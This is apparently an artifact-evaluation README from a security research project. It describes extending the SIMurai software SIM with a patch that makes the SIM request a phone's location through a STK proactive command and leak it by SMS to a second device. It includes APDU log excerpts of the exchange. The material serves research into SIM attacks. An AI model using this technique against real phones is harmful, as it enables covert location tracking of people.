# SIM-based Spyware

This experiment extends SIMurai with SIM-based spyware, corresponding to Section `6.2.1 Simulating SIM Spyware` in our paper. SIM cards can issue commands to the connected smartphone. SIM-based spyware abuses this feature for, e.g., retrieval of the smartphone's location, and leaking that to an outside attacker via SIM-initiated SMS.

## Setup

Please refer to the [Setup 1 README](../../1__setup/1__physical_ue/README.md) for setup and installation instructions. Here, we use the same setup, but extend SIMurai to feature the SIM-based spyware.

## Building and Running

The installation script applies the patch `spyware.patch` that extends SIMurai.

### Running

Please refer to the [Setup 1 README](../../1__setup/1__physical_ue/README.md) for a detailed description of commandline arguments. This script accepts the exact same set of parameters except when running setup 1 using this script, it will use the SIMurai that implements a spyware, instead of the unmodified SIMurai.

### Interpretation of Results

UE1 should detect SIMurai and connect to the network in a manner identical to [setup 1](../../1__setup/1__physical_ue/README.md).

Once the "SIM toolkit" application shows up in the application list on the phone, you can click the item named "Steal location via SMS", then "Run". This will trigger the spyware on SIMurai. This could happen automatically and without interaction of the user, but for the sake of clarity, in the AE we require the 2 clicks.

Once the spyware is activated, SIMurai will proceed by sending a request to obtain location information of UE1. Once the terminal obtains this information and sends it back to SIMurai, another message will be created to send the obtained location information inside an SMS to UE2.

The exchange will look like this (we performed the experiment ourselves and extracted the following log excerpts from `log/simtrace2.log`):
1. SIMurai creates a `PROVIDE LOCAL INFORMATION` proactive command that requests location information from UE1. UE1 uses a `FETCH` APDU to obtain the proactive command:
```
DLGLOBAL INFO => DATA: flags=0x01 (HDR ), 80 12 00 00 0b
 DLINP DEBUG [0] <= osmo_st2_cardem_request_pb_and_tx(pb=12, tx=d0 09 81 03 00 26 00 82 02 81 83 , len=11)
DLINP DEBUG [0] <= osmo_st2_cardem_request_sw_tx(sw=9000)
```
2. UE1 responds with a `TERMINAL RESPONSE` APDU that includes the location information:
```
DLGLOBAL INFO => DATA: flags=0x01 (HDR ), 80 14 00 00 15
 DLINP DEBUG [0] <= osmo_st2_cardem_request_pb_and_rx(pb=14, le=21)
DLGLOBAL INFO => DATA: flags=0x02 (FINAL ), 81 03 00 26 00 02 02 82 81 83 01 00 13 07 99 f9 99 03 e8 00 0a
 DLINP DEBUG [0] <= osmo_st2_cardem_request_sw_tx(sw=9134)
```
3. SIMurai extracts the location information, i.e., `99 f9 99 03 e8 00 0a`, from the `TERMINAL RESPONSE`.
4. SIMurai packages up the location information into a `SEND SHORT MESSAGE` proactive command. UE1 uses a `FETCH` APDU to obtain the proactive command:
```
DLGLOBAL INFO => DATA: flags=0x01 (HDR ), 80 12 00 00 34
 DLINP DEBUG [0] <= osmo_st2_cardem_request_pb_and_tx(pb=12, tx=d0 32 81 03 00 13 00 82 02 81 83 8b 27 01 00 07 91 00 00 00 f1 00 08 1c 00 39 00 39 00 46 00 39 00 39 00 39 00 30 00 33 00 45 00 38 00 30 00 30 00 30 00 41 , len=52)
DLINP DEBUG [0] <= osmo_st2_cardem_request_sw_tx(sw=9000)
```
5. The SMS will take around 30 seconds to get delivered to UE2. Once it is delivered, UE2 will receive the message containing text: `99F99903E8000A` that is the hex string of the raw location information bytes.

SIMurai also logs the exchange in `log/simurai.log` as follows:
```
Proactive command present, overwriting status 9000 to 910B len=0x000B.
Terminal response: parsing.
Terminal response: 810300260002028281830100130799F99903E8000A
Card response: sending SMS with location.
Location information: 99F99903E8000A
Card response: D0328103001300820281838B2701000791000000F100081C00390039004600390039003900300033004500380030003000300041
```
Here we can once again see the `TERMINAL RESPONSE`, followed by a `SEND SHORT MESSAGE` proactive command inserted into the card response to a `FETCH` APDU.
